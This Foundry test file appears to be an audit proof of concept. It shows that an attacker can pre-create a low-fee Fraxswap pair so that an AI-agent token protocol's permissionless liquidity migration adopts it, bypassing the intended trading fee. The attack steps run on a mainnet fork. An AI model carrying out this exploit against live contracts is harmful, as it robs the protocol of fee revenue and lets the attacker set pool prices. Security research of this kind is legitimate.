// SPDX-License-Identifier: ISC
pragma solidity >=0.8.25 <0.9.0;

import {Test} from "forge-std/src/Test.sol";
import {console2} from "forge-std/src/console2.sol";
import {IFraxswapPair} from "dev-fraxswap/src/contracts/core/interfaces/IFraxswapPair.sol";
import {AgentFactory} from "../../src/AgentFactory.sol";
import {TokenGovernor} from "../../src/TokenGovernor.sol";
import {Agent} from "../../src/Agent.sol";
import {AIToken} from "../../src/AIToken.sol";
import {LiquidityManager} from "../../src/LiquidityManager.sol";
import {BootstrapPool} from "../../src/BootstrapPool.sol";
import {IERC20} from "@openzeppelin/contracts/interfaces/IERC20.sol";

/// @notice P104 PoC for the IQ-AI M-01 candidate: permissionless migration adopts an attacker-pre-created
/// Fraxswap pair. `LiquidityManager.addLiquidityToFraxswap` does `getPair(currency, agent)` and only creates the
/// pair with the protocol's intended `fee` when none exists. An attacker can `createPair(currency, agent, lowFee)`
/// beforehand (createPair is permissionless on the Fraxswap factory), so the protocol migrates into a pool whose
/// fee the attacker chose — the protocol's intended trading fee is bypassed for the life of the pool (lost fee
/// revenue), and the attacker controls the pool's initial price/reserves.
contract M01PreCreatePairPoC is Test {
    IERC20 currencyToken = IERC20(0xFc00000000000000000000000000000000000001);
    address whale = 0x00160baF84b3D2014837cc12e838ea399f8b8478;
    address attacker = address(0xA11CE);

    AgentFactory factory;
    Agent agent;
    AIToken token;
    LiquidityManager manager;
    BootstrapPool bootstrapPool;

    function setUp() public {
        vm.createSelectFork(vm.envString("FRAXTAL_MAINNET_URL"), 12_918_968);
    }

    function _deployAndReachEndCriterion() internal {
        factory = new AgentFactory(currencyToken, 0);
        factory.setAgentBytecode(type(Agent).creationCode);
        factory.setGovenerBytecode(type(TokenGovernor).creationCode);
        factory.setLiquidityManagerBytecode(type(LiquidityManager).creationCode);
        factory.setTargetCCYLiquidity(1000e18);
        factory.setInitialPrice(0.1e18);

        vm.startPrank(whale);
        currencyToken.approve(address(factory), 1e18);
        agent = factory.createAgent("AIAgent", "AIA", "https://example.com", 0);
        token = agent.token();
        manager = LiquidityManager(factory.agentManager(address(agent)));
        bootstrapPool = manager.bootstrapPool();
        currencyToken.approve(address(bootstrapPool), 10_000_000e18);
        bootstrapPool.buy(6_000_000e18);
        for (uint256 i = 0; i < 100; i++) {
            (uint256 r, ) = bootstrapPool.getReserves();
            if (r - bootstrapPool.phantomAmount() > 1000e18) break;
            bootstrapPool.buy(10_000e18);
        }
        vm.stopPrank();
    }

    /// VULNERABLE PATH: attacker pre-creates the pair with a LOW fee; migration adopts it.
    function test_M01_attacker_precreate_low_fee_is_adopted() public {
        _deployAndReachEndCriterion();

        uint256 intendedFee = manager.fee(); // protocol's intended trading fee (e.g. 100 = 1%)
        uint256 attackerFee = 1;             // attacker chooses a near-zero fee

        // (L1) permissionless: attacker, with no protocol role, pre-creates the pair.
        vm.prank(attacker);
        address attackerPair = manager.fraxswapFactory().createPair(address(currencyToken), address(token), attackerFee);

        // (L1) permissionless: anyone triggers the migration.
        vm.prank(attacker);
        manager.moveLiquidity();

        // (L2) the protocol migrated into the ATTACKER's pre-created pair (not a protocol-created one).
        address migratedPair = manager.fraxswapFactory().getPair(address(currencyToken), address(token));
        assertEq(migratedPair, attackerPair, "protocol adopted the attacker-pre-created pair");

        // Fraxswap encodes pair.fee() = 10_000 - feeBps. The protocol would have created the pair with
        // feeBps = manager.fee() (intended trading fee); the attacker set a far lower feeBps.
        uint256 adoptedFeeEnc = IFraxswapPair(migratedPair).fee();      // 10_000 - attackerFee
        uint256 intendedFeeEnc = 10_000 - intendedFee;                  // what the protocol would have set
        uint256 adoptedFeeBps = 10_000 - adoptedFeeEnc;                 // actual swap fee charged by the pool
        // (L3) the intended trading fee was bypassed; the adopted pool charges a LOWER fee -> lost fee revenue.
        assertTrue(adoptedFeeEnc != intendedFeeEnc, "protocol's intended trading fee was bypassed");
        assertLt(adoptedFeeBps, intendedFee, "attacker pool charges a LOWER swap fee than intended -> lost fee revenue");
        assertEq(adoptedFeeBps, attackerFee, "adopted swap fee == the attacker's chosen fee");
        console2.log("intended feeBps:", intendedFee);
        console2.log("attacker-adopted feeBps:", adoptedFeeBps);
    }
}
